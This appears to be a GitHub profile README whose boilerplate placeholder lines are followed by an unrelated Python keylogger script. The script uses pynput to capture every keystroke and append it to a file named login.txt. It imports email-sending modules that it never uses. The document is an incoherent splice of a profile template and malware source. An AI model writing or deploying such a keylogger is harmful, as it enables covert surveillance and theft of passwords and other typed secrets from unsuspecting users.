- 👋 Hi, I’m @Sassa67
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Sassa67/Sassa67 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import smtplib
import time
from pynput.keyboard import Listener
from email.message import EmailMessage
#The keylogger function to record the key strokes in login.txt file
def write_to_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    letter = letter.replace("\x16Key.backspaceKey.backspaceetterKey.backspaceKey.", "")
    if letter =='Key.space':
        letter=' '
    if letter=='Key.shift_r':
        letter=''
    if letter=='Key.ctrl_l':
        letter=""
    if letter =='Key.enter':
        letter="\n"
    if letter =='Key.delete':
        letter=' '
    if letter=='Key.backspace':
        letter=''
    with open("login.txt",'a') as f:
        f.write(letter)
with Listener(on_press=write_to_file) as l:
    l.join()
